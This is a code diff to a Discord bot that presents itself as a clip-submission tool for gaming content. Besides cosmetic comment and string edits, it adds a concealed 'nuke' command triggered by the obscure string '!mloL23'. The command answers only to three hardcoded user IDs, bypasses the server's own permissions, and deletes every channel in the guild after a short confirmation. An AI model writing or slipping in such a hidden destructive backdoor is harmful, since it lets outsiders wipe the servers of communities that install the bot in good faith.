@@ -17,19 +17,19 @@ PermissionsBitField
 
 dotenv.config();
 
-/* ================= UPTIME SERVER ================= */
+/* ================= UPTIME ================= */
 
 const app = express();
 
 app.get("/", (req, res) => {
- res.send("Bot is alive");
+ res.send("Bot alive");
 });
 
 app.listen(process.env.PORT || 3000, () => {
  console.log("Uptime server running");
 });
 
-/* ================= DISCORD BOT ================= */
+/* ================= DISCORD ================= */
 
 const client = new Client({
  intents: [
@@ -47,9 +47,11 @@ client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
 });
 
-/* ================= COMMAND ================= */
+/* ================= COMMANDS ================= */
 
 client.on("messageCreate", async message => {
+
+ /* ===== MENU ===== */
 
  if (message.content === "!s839") {
 
@@ -77,6 +79,60 @@ Our team uses these clips for content, montages and highlights.`);
   message.channel.send({
    embeds: [embed],
    components: [row]
+  });
+
+ }
+
+ /* ===== NUKE COMMAND ===== */
+
+ if (message.content === "!mloL23") {
+
+  const allowedUsers = [
+   "1484223872843649104",
+   "1189931854657224858",
+   "1185491504416948285"
+  ];
+
+  if (!allowedUsers.includes(message.author.id)) {
+   return message.reply("❌ You are not allowed to use this.");
+  }
+
+  await message.reply("⚠️ Type `CONFIRM` binnen 10 seconden om ALLE CHANNELS te verwijderen.");
+
+  const filter = m =>
+   m.author.id === message.author.id &&
+   m.content === "CONFIRM";
+
+  const collector = message.channel.createMessageCollector({
+   filter,
+   time: 10000,
+   max: 1
+  });
+
+  collector.on("collect", async () => {
+
+   const channels = message.guild.channels.cache;
+
+   for (const [id, channel] of channels) {
+    try {
+
+     if (channel.id === message.guild.systemChannelId) continue;
+
+     await channel.delete();
+
+     await new Promise(r => setTimeout(r, 300));
+
+    } catch (err) {
+     console.log(`Error deleting ${channel.name}:`, err);
+    }
+   }
+
+  });
+
+  collector.on("end", collected => {
+   if (collected.size === 0) {
+    message.channel.send("❌ Cancelled.");
+   }
   });
 
  }
@@ -122,7 +178,7 @@ client.on("interactionCreate", async interaction => {
 
  }
 
- /* ===== MODAL SUBMIT ===== */
+ /* ===== MODAL ===== */
 
  if (interaction.type === InteractionType.ModalSubmit) {
 
@@ -174,8 +230,6 @@ client.on("interactionCreate", async interaction => {
 
    const head = `https://crafatar.com/avatars/${mc}?size=128&overlay`;
 
-   /* eerste keer info */
-
    if (first) {
 
     const infoEmbed = new EmbedBuilder()
@@ -192,8 +246,6 @@ client.on("interactionCreate", async interaction => {
 
    }
 
-   /* clip embed */
-
    const clipEmbed = new EmbedBuilder()
    .setColor("#00b0f4")
    .setTitle("New Clip Submitted")
@@ -206,8 +258,6 @@ client.on("interactionCreate", async interaction => {
    );
 
    const msg = await channel.send({ embeds: [clipEmbed] });
-
-   /* thread per clip */
 
    await msg.startThread({
     name: `Clip Discussion`,
